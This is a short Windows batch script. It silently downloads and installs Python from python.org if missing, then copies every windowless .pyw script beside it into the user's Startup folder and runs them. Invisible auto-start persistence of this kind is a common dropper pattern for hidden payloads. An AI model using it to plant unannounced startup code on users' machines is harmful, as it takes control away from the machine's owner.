@echo off


python --version >nul 2>&1
if %errorlevel% neq 0 (
    echo Python not found. Download and install Python.

    powershell -Command "Invoke-WebRequest -Uri 'https://www.python.org/ftp/python/3.11.5/python-3.11.5-amd64.exe' -OutFile 'python-installer.exe'"

    start /wait python-installer.exe /quiet InstallAllUsers=1 PrependPath=1

    del python-installer.exe

    echo Python installed successfully 
) else (
    echo Python already installed
)

copy "%~dp0\*.pyw" "%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup"

start "" python "%~dp0\*.pyw"

